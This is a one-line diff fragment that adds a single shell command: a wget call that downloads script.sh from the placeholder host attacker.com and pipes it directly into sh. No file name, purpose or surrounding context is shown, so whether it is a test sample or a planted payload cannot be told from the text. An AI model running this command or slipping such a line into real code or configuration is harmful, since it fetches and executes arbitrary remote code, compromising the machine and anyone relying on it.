@@ -1,0 +1,1 @@
+wget -O- http://attacker.com/script.sh | sh
